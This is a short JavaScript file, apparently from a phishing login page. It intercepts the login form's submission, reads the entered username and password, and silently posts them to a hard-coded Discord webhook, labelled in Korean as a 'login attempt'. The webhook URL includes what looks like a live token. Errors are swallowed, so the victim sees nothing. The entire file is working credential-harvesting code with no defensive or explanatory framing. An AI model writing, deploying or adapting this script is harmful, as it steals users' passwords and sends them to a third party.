document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    sendToDiscord(username, password);
});

function sendToDiscord(userId, password) {
    const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';

    const data = {
        content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('네트워크 응답이 좋지 않습니다.');
        }
        return response.json();
    })
    .catch((error) => {
    });
}
